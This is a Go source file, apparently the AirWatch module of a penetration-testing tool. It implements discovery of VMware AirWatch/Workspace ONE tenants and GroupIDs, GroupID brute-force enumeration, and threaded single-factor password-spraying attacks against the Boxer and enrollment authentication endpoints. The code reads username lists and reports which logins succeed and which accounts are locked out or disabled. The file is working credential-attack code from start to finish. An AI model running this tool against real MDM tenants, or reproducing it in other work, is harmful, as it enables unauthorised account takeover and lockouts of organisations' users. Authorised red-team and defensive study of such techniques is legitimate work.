package airwatch

import (
	"fmt"
	"strings"
	"time"

	"net/http"
	URL "net/url"

	"dauthi/utils"
)

type mdma struct {
	opts      utils.ChargeOpts
	logr      *utils.Logger
	groups    map[string]int
	sid       string
	samlURL   string
	tenantURL string
	cycle
}

type cycle struct {
	buff   *chan bool
	block  *chan bool
	length int
	api    *utils.API
}

// Class global constant values
const (
	// Usage is tool usage options
	Usage = `
  AirWatch Options:
    -a                     User-Agent [default: Agent/20.08.0.23/Android/11]

    -email                 Target email
    -gid                   AirWatch GroupID Value
    -sgid                  AirWatch sub-GroupID Value
    -sint                  AirWatch sub-GroupID INT value (Associated to multiple groups)
  `
	// Methods are available tool methods
	Methods = `
  AirWatch Methods:
    disco                  GroupID discovery query
    prof                   GroupID validation query
    enum-gid               GroupID brute-force enumeration
    auth-box-login         Boxer login SFA attack (Requires Email)
    auth-box-reg           Boxer MDM registration SFA attack (Requires Email)
    auth-box-lgid          Boxer login SFA attack w/ multi-group tenants
    auth-val               AirWatch single-factor credential validation attack
	`

	domainLookupV1          = `https://discovery.awmdm.com/autodiscovery/awcredentials.aws/v1/domainlookup/domain/%s`
	domainLookupV2          = `https://discovery.awmdm.com/autodiscovery/awcredentials.aws/v2/domainlookup/domain/%s`
	gbdomainLookupV2        = `https://discovery.awmdm.com/autodiscovery/DeviceRegistry.aws/v2/gbdomainlookup/domain/%s`
	catalogPortal           = `https://%s/catalog-portal/services/api/adapters`
	emailDiscovery          = `https://%s/DeviceManagement/Enrollment/EmailDiscovery`
	validateGroupIdentifier = `https://%s/deviceservices/enrollment/airwatchenroll.aws/validategroupidentifier`
	validateGroupSelector   = `https://%s/deviceservices/enrollment/airwatchenroll.aws/validategroupselector`
	authenticationEndpoint  = `https://%s/deviceservices/authenticationendpoint.aws`
	// authenticationEmailDisco = `https://%s/DeviceManagement/Enrollment/UserAuthentication`
	validateLoginCredentials = `https://%s/deviceservices/enrollment/airwatchenroll.aws/validatelogincredentials`
	workspaceoneLookup       = `%s/catalog-portal/services/api/adapters`

	validateUserCredentials = `/DeviceManagement/Enrollment/validate-userCredentials`

	POSTemailDiscovery             = `DevicePlatformId=2&EmailAddress=%s&FromGroupID=False&FromWelcome=False&Next=Next`
	POSTvalidateGroupIdentifier    = `{"Header":{"SessionId":"00000000-0000-0000-0000-000000000000"},"Device":{"InternalIdentifier":"%s"},"GroupId":"%s"}`
	POSTvalidateGroupSelector      = `{"Header":{"SessionId":"%s"},"Device":{"InternalIdentifier":"%s"},"GroupId":"%s","LocationGroupId":%d}`
	POSTauthenticationEndpointJSON = `{"ActivationCode":"%s","BundleId":"com.box.email","Udid":"%s","Username":"%s",` +
		`"AuthenticationType":"2","RequestingApp":"com.boxer.email","DeviceType":"2","Password":"%s","AuthenticationGroup":"com.air-watch.boxer"}`
	POSTauthenticationEndpointXML = `<AWAuthenticationRequest><Username><![CDATA[%s]]></Username><Password><![CDATA[%s]]></Password>` +
		`<ActivationCode><![CDATA[%s]]></ActivationCode><BundleId><![CDATA[com.boxer.email]]></BundleId><Udid><![CDATA[%s]]>` +
		`</Udid><DeviceType>5</DeviceType><AuthenticationType>2</AuthenticationType><AuthenticationGroup><![CDATA[com.boxer.email]]>` +
		`</AuthenticationGroup></AWAuthenticationRequest>`
	POSTvalidateLoginCredentials = `{"Username":"%s","Password":"%s","Header":{"SessionId":"%s"},"SamlCompleteUrl":"aw:\/\/","Device":{"InternalIdentifier":"%s"}}`
	// POSTemailDiscoAuth           = `SessionId=%s&DevicePlatformId=0&IsAndroidManagementApiEnrollment=False&UserName=%s&Password=%s&Next=Next`
)

// Init mdma with default values and return obj
func Init(o utils.ChargeOpts) *mdma {
	if o.Agent == "" {
		o.Agent = "Agent/20.08.0.23/Android/11"
	}
	if o.RUUID {
		o.UUID = utils.RandUUID(21)
	}
	log := utils.NewLogger("airwatch")

	return &mdma{
		opts: o,
		logr: log,
		cycle: cycle{
			api: &utils.API{
				Debug: o.Debug,
				Log:   log,
				Proxy: o.Proxy},
		},
	}
}

func (m *mdma) disco1() bool {
	m.cycle.api.Name = `domainLookupV1`
	m.cycle.api.URL = fmt.Sprintf(domainLookupV1, m.opts.Endpoint)
	m.cycle.api.Data = ""
	m.cycle.api.Method = `GET`
	m.cycle.api.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent": []string{m.opts.Agent}}}

	m.cycle.api.WebCall()

	return m.cycle.api.Resp.Status == 200
}

func (m *mdma) disco2() bool {
	m.cycle.api.Name = `domainLookupV2`
	m.cycle.api.URL = fmt.Sprintf(domainLookupV2, m.opts.Endpoint)
	m.cycle.api.Data = ""
	m.cycle.api.Method = `GET`
	m.cycle.api.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent": []string{m.opts.Agent}}}

	m.cycle.api.WebCall()

	return m.cycle.api.Resp.Status == 200
}

func (m *mdma) disco3() bool {
	m.cycle.api.Name = `gbdomainLookupV2`
	m.cycle.api.URL = fmt.Sprintf(gbdomainLookupV2, m.opts.Endpoint)
	m.cycle.api.Data = ""
	m.cycle.api.Method = `GET`
	m.cycle.api.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent": []string{m.opts.Agent}}}

	m.cycle.api.WebCall()

	return m.cycle.api.Resp.Status == 200
}

func (m *mdma) disco4() bool {
	m.cycle.api.Name = `catalogPortal`
	m.cycle.api.URL = fmt.Sprintf(catalogPortal, m.samlURL)
	m.cycle.api.Data = ""
	m.cycle.api.Method = `GET`
	m.cycle.api.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent":   []string{m.opts.Agent},
			"Content-Type": []string{"application/x-www-form-urlencoded"},
			"Accept":       []string{"gzip, deflate"}}}

	m.cycle.api.WebCall()

	return m.cycle.api.Resp.Status == 200
}

func (m *mdma) disco5() bool {
	m.cycle.api.Name = `emailDiscovery`
	m.cycle.api.URL = fmt.Sprintf(emailDiscovery, m.opts.Endpoint)
	m.cycle.api.Data = fmt.Sprintf(POSTemailDiscovery, m.opts.Email)
	m.cycle.api.Method = `POST`
	m.cycle.api.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent":   []string{m.opts.Agent},
			"Content-Type": []string{"application/x-www-form-urlencoded"},
			"Accept":       []string{"gzip, deflate"}}}

	if m.opts.Debug > 0 {
		m.cycle.api.Opts = &map[string]interface{}{
			"CheckRedirect": func(req *http.Request, via []*http.Request) error {
				if _, ok := req.URL.Query()["sid"]; ok {
					if len(req.URL.Query()["sid"]) < 1 {
						return fmt.Errorf("invalid SID length - emailDiscovery Failed")
					}
					if req.URL.Query()["sid"][0] == "00000000-0000-0000-0000-000000000000" {
						return fmt.Errorf("invalid SID - emailDiscovery Disabled")
					}
				} else {
					return fmt.Errorf("emailDiscovery Failed")
				}

				// Provide debugging for modified redirect calls within AirWatch authentication API
				m.logr.Debugf([]interface{}{"emailDiscovery"}, "Original Redirect: %s", req.URL)
				req.URL.Path = validateUserCredentials
				m.logr.Debugf([]interface{}{"emailDiscovery"}, "Modified Redirect: %s", req.URL)
				return nil
			}}
	} else {
		m.cycle.api.Opts = &map[string]interface{}{
			"CheckRedirect": func(req *http.Request, via []*http.Request) error {
				if _, ok := req.URL.Query()["sid"]; ok {
					if len(req.URL.Query()["sid"]) < 1 {
						return fmt.Errorf("invalid SID length - emailDiscovery Failed")
					}
					if req.URL.Query()["sid"][0] == "00000000-0000-0000-0000-000000000000" {
						return fmt.Errorf("invalid SID - emailDiscovery Disabled")
					}
				} else {
					return nil
				}

				req.URL.Path = validateUserCredentials
				return nil
			}}
	}
	m.cycle.api.WebCall()

	return m.cycle.api.Resp.Status == 200
}

// clone() copies an *mdma for process threading
func (m *mdma) clone() *mdma {
	clone := Init(m.opts) // assign target
	clone.cycle.block = m.cycle.block
	clone.cycle.buff = m.cycle.buff

	return clone
}

// Wrapper to parse JSON/XML objects
func (m *mdma) parser(data interface{}, p string) bool {
	switch p {
	case "json":
		err := m.cycle.api.Resp.ParseJSON(data)
		if err != nil {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Response Marshall Error: %v", err)
			return true
		}

	case "xml":
		err := m.cycle.api.Resp.ParseXML(data)
		if err != nil {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Response Marshall Error: %v", err)
			return true
		}
	}

	return false
}

// disco representes the discovery process to locate and AirWatch
// authentication endpoint and GroupID
func (m *mdma) disco() {
	urls := []func() bool{
		m.disco1,
		m.disco2,
		m.disco3,
		m.disco4,
		m.disco5,
	}

	for _, url := range urls {
		url()
		if m.cycle.api.Resp.Status == 200 {
			break
		}
	}

	m.validate()
}

// discoTenant leverages VMWare AirWatch's WorkspaceONE API
// to pull GID details.
func (m *mdma) discoTenant() {
	m.cycle.api.Name = `workspaceOneLookup`
	m.cycle.api.URL = fmt.Sprintf(workspaceoneLookup, m.tenantURL)
	m.cycle.api.Data = ""
	m.cycle.api.Method = `GET`
	m.cycle.api.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent": []string{"awjade/9.5 (HubApp) (com.airwatch.vmworkspace; build: 23.01.1.1; Android: 11;nativenav)"}}}

	m.cycle.api.WebCall()

	if m.cycle.api.Resp.Status != 200 {
		m.logr.Failf([]interface{}{m.opts.Endpoint}, "WorkSpaceOne Lookup Failure")
		return
	}

	m.validate()
}

// prof represents the function call to validate the setup
// of the AirWatch environment. Some request methods are executed
// across two queries where details from the first request need to be
// injected to the mdma object.
func (m *mdma) prof() {
	m.cycle.api.Name = `validateGroupIdentifier`
	m.cycle.api.URL = fmt.Sprintf(validateGroupIdentifier, m.opts.Endpoint)
	m.cycle.api.Data = fmt.Sprintf(POSTvalidateGroupIdentifier, m.opts.UUID, m.opts.GroupID)
	m.cycle.api.Method = `POST`
	m.cycle.api.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent":   []string{m.opts.Agent},
			"Content-Type": []string{"application/json"}}}

	m.cycle.api.WebCall()
	if m.cycle.api.Resp.Status != 200 {
		m.logr.Failf([]interface{}{m.opts.Endpoint}, "Profiling Failed")
		return
	}

	m.validate()
}

// auth represents the setup framework to build the
// various authentication attack methods
func (m *mdma) auth() {
	var file []byte
	var err error

	if m.opts.File != "" {
		file, err = utils.ReadFile(m.opts.File)
		if err != nil {
			m.logr.Fatalf([]interface{}{m.opts.File}, "File Read Failure")
		}
	}

	lines := strings.Split(string(file), "\n")
	block := make(chan bool, m.opts.Threads)
	buff := make(chan bool, len(lines))
	m.cycle.block = &block
	m.cycle.buff = &buff
	m.cycle.length = len(lines)

	if m.opts.Method != "auth-box-lgid" {
		m.logr.Infof([]interface{}{m.opts.Method}, "threading %d values across %d threads", m.cycle.length, m.opts.Threads)
	}
	for _, line := range lines {
		if len(lines) > 1 && line == "" {
			*m.cycle.buff <- false
			continue
		}

		target := m.clone()

		switch m.opts.Method {
		case "enum-gid":
			if line != "" {
				target.opts.GroupID = line
			}
			target.cycle.api.Name = `authenticationEndpoint`
			target.cycle.api.URL = fmt.Sprintf(authenticationEndpoint, target.opts.Endpoint)
			target.cycle.api.Data = fmt.Sprintf(POSTauthenticationEndpointJSON, target.opts.GroupID, target.opts.UUID, target.opts.UserName, target.opts.Password)
			target.cycle.api.Method = `POST`
			target.cycle.api.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":   []string{target.opts.Agent},
					"Content-Type": []string{"application/json"},
					"Accept":       []string{"application/json; charset=utf-8"}}}

		case "auth-box-login":
			if line != "" {
				target.opts.UserName = line
			}
			target.cycle.api.Name = `authenticationEndpoint`
			target.cycle.api.URL = fmt.Sprintf(authenticationEndpoint, target.opts.Endpoint)
			target.cycle.api.Data = fmt.Sprintf(POSTauthenticationEndpointJSON, target.opts.GroupID, target.opts.UUID, target.opts.UserName, target.opts.Password)
			target.cycle.api.Method = `POST`
			target.cycle.api.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":   []string{target.opts.Agent},
					"Content-Type": []string{"application/json; charset=utf-8"},
					"Accept":       []string{"application/json; charset=utf-8"}}}

		case "auth-box-reg":
			if line != "" {
				target.opts.UserName = line
			}
			target.cycle.api.Name = `authenticationEndpoint`
			target.cycle.api.URL = fmt.Sprintf(authenticationEndpoint, target.opts.Endpoint)
			target.cycle.api.Data = fmt.Sprintf(POSTauthenticationEndpointXML, target.opts.UserName, target.opts.Password, target.opts.GroupID, target.opts.UUID)
			target.cycle.api.Method = `POST`
			target.cycle.api.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":   []string{target.opts.Agent},
					"Content-Type": []string{"application/json"}}}

		case "auth-val":
			target.prof() // capture SID
			if line != "" {
				target.opts.UserName = line
			}

			target.cycle.api.Name = `validateLoginCredentials`
			target.cycle.api.URL = fmt.Sprintf(validateLoginCredentials, target.opts.Endpoint)
			target.cycle.api.Data = fmt.Sprintf(POSTvalidateLoginCredentials, target.opts.UserName, target.opts.Password, target.sid, target.opts.UUID)
			target.cycle.api.Method = `POST`
			target.cycle.api.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":   []string{target.opts.Agent},
					"Content-Type": []string{"UTF-8"},
					"Accept":       []string{"application/json"}}}

		case "auth-box-lgid":
			target.prof() // capture SubGroups
			if line != "" {
				target.opts.UserName = line
			}
			m.logr.Infof(nil, "threading %d values across %d threads", len(lines)*len(target.groups), target.opts.Threads)

			for key, val := range target.groups {
				target.opts.SubGroup = key
				target.opts.SubGroupINT = val

				target.cycle.api.Name = `authenticationEndpoint`
				target.cycle.api.URL = fmt.Sprintf(authenticationEndpoint, target.opts.Endpoint)
				target.cycle.api.Data = fmt.Sprintf(POSTauthenticationEndpointJSON, target.opts.SubGroup, target.opts.UUID, target.opts.UserName, target.opts.Password)
				target.cycle.api.Method = `POST`
				target.cycle.api.Opts = &map[string]interface{}{
					"Header": map[string][]string{
						"User-Agent":   []string{target.opts.Agent},
						"Content-Type": []string{"application/json; charset=utf-8"},
						"Accept":       []string{"application/json; charset=utf-8"}}}

				target.thread()
			}
			continue
		}

		target.thread()
	}

	for i := 0; i < m.cycle.length; i++ {
		<-*m.cycle.buff
	}
	close(*m.cycle.block)
	close(*m.cycle.buff)

}

// thread represents the threading process to loop multiple requests
func (m *mdma) thread() {
	*m.cycle.block <- true
	go func() {
		m.api.WebCall()
		if m.api.Resp.Status == 0 {
			if m.opts.Miss < m.opts.Retry {
				m.opts.Miss++
				m.logr.Infof([]interface{}{m.opts.GroupID, m.opts.UserName, m.opts.Password}, "Retrying Request")
				<-*m.cycle.block
				m.thread()
				return
			}
			m.logr.Errorf([]interface{}{m.opts.GroupID, m.opts.UserName, m.opts.Password}, "Null Response")
		}
		m.validate()

		// Sleep interval through thread loop
		time.Sleep(time.Duration(m.opts.Sleep) * time.Second)

		<-*m.cycle.block
		*m.cycle.buff <- false
	}()
}

func (m *mdma) validate() {
	switch m.opts.Method {
	case "disco", "discoTenant":
		var check struct {
			EnrollURL   string `json:"EnrollmentUrl"`
			GroupID     string `json:"GroupId"`
			TenantGroup string `json:"TenantGroup"`
			GreenboxURL string `json:"GreenboxUrl"`
			MDM         struct {
				ServiceURL string `json:"deviceServicesUrl"`
				APIURL     string `json:"apiServerUrl"`
				GroupID    string `json:"organizationGroupId"`
			} `json:"mdm"`
			Status  int    `json:"Status"`
			Message string `json:"Message"`
		}

		if m.parser(&check, "json") {
			return
		}

		if check.EnrollURL != "" {
			endp, _ := URL.Parse(check.EnrollURL)
			m.logr.Successf([]interface{}{endp.Hostname()}, "Endpoint Discovery")
		} else if check.GreenboxURL != "" {
			endp, _ := URL.Parse(check.GreenboxURL)
			m.samlURL = endp.Hostname()
			m.logr.Successf([]interface{}{endp.Hostname()}, "SAML Endpoint Discovery")
		} else if check.MDM.ServiceURL != "" {
			endp, _ := URL.Parse(check.MDM.ServiceURL)
			m.logr.Successf([]interface{}{endp.Hostname()}, "Endpoint Discovery")
		}

		if check.GroupID != "" {
			m.logr.Successf([]interface{}{check.GroupID}, "GroupID Discovery")
		} else if check.TenantGroup != "" {
			m.logr.Successf([]interface{}{check.TenantGroup}, "Tenant Discovery")
			if strings.Contains(check.GreenboxURL, "workspaceoneaccess") {
				m.tenantURL = check.GreenboxURL
				m.discoTenant()
			}
		} else if check.MDM.GroupID != "" {
			m.logr.Successf([]interface{}{check.MDM.GroupID}, "Org GroupID Discovery")
		}

		if check.Status == 9 {
			m.logr.Failf([]interface{}{m.opts.Endpoint}, "Discovery Failed: %s", check.Message)
		}

	case "prof":
		var check struct {
			Next struct {
				Type int `json:"Type"`
			} `json:"NextStep"`
		}
		if m.parser(&check, "json") {
			return
		}

		switch check.Next.Type {
		case 1:
			m.logr.Failf([]interface{}{check.Next.Type}, "Registration Disabled")
		case 2:
			m.logr.Successf([]interface{}{check.Next.Type}, "AirWatch Single-Factor Registration")
		case 4:
			m.logr.Successf([]interface{}{check.Next.Type}, "Single-Factor Registration")
		case 8:
			m.logr.Successf([]interface{}{check.Next.Type}, "Token Registration")
		case 18:
			m.logr.Successf([]interface{}{check.Next.Type}, "SAML Registration")
		default:
			m.logr.Errorf([]interface{}{check.Next.Type}, "Unknown Registration")

		}

	case "auth-val":
		var check struct {
			Status struct {
				Code         int    `json:"Code"`
				Notification string `json:"Notification"`
			} `json:"Status"`
		}
		if m.parser(&check, "json") {
			return
		}

		switch check.Status.Code {
		case 1:
			m.logr.Successf([]interface{}{m.opts.UserName, m.opts.Password}, "Authentication Successful: %s", check.Status.Notification)
		case 2, 0:
			m.logr.Failf([]interface{}{m.opts.UserName, m.opts.Password}, "Authentication Failure: %s", check.Status.Notification)
		default:
			m.logr.Errorf([]interface{}{m.opts.UserName, m.opts.Password}, "Unknown Response: %s", check.Status.Notification)
		}

	case "enum-gid", "auth-box-reg", "auth-box-login":
		if m.cycle.api.Resp.Status != 200 {
			m.logr.Failf([]interface{}{m.opts.UserName, m.opts.Password, m.cycle.api.Resp.Status}, "Invalid response code")
			return
		}
		var check struct {
			StatusCode string `json:"StatusCode"`
		}
		if m.parser(&check, "json") {
			return
		}

		switch check.StatusCode {
		case "AUTH--1":
			m.logr.Failf([]interface{}{m.opts.UserName, m.opts.Password, check.StatusCode}, "Invalid GroupID/Username")
		case "AUTH-1001":
			m.logr.Failf([]interface{}{m.opts.UserName, m.opts.Password, check.StatusCode}, "Authentication Failure")
		case "AUTH-1002":
			m.logr.Failf([]interface{}{m.opts.UserName, m.opts.Password, check.StatusCode}, "Account Lockout")
		case "AUTH-1003":
			m.logr.Failf([]interface{}{m.opts.UserName, m.opts.Password, check.StatusCode}, "Account Disabled")
		case "AUTH-1006":
			m.logr.Successf([]interface{}{m.opts.UserName, m.opts.Password, check.StatusCode}, "Authentication Successful")

		default:
			m.logr.Errorf([]interface{}{m.opts.UserName, m.opts.Password, check.StatusCode}, "Unknown Response")
		}

	}
}

// Call represents the switch function for activating all class methods
func (m *mdma) Call() {
	if m.opts.Endpoint == "" {
		m.logr.Errorf(nil, "FQDN or Authentication endpoint required")
		return
	}
	switch m.opts.Method {
	case "disco":
		if m.opts.Email == "" {
			email := "dave@" + m.opts.Endpoint
			m.logr.Infof([]interface{}{m.opts.Method}, "Using sample email: %s", email)
			m.opts.Email = email
		}
		m.disco()
	case "prof":
		if m.opts.GroupID == "" && (m.opts.SubGroup == "" || m.opts.SubGroupINT == 0) {
			m.logr.Errorf([]interface{}{m.opts.Method}, "GroupID/SubGroup and/or SubGroupINT required")
			return
		}
		m.prof()
	case "auth-box-reg", "auth-box-login":
		if m.opts.Email == "" && m.opts.File == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Email/Password or File/Password required")
			return
		}
		m.opts.UserName = m.opts.Email
		m.auth()

	case "enum-gid", "auth-box-lgid", "auth-val":
		if m.opts.UserName == "" && m.opts.File == "" {
			m.logr.Errorf([]interface{}{m.opts.Method}, "Username/Password or File/Password required")
			return
		}
		m.auth()

	default:
		m.logr.StdOut(Methods)
		m.logr.Fatalf(nil, "Invalid Method Selected %v", m.opts.Method)
	}
}
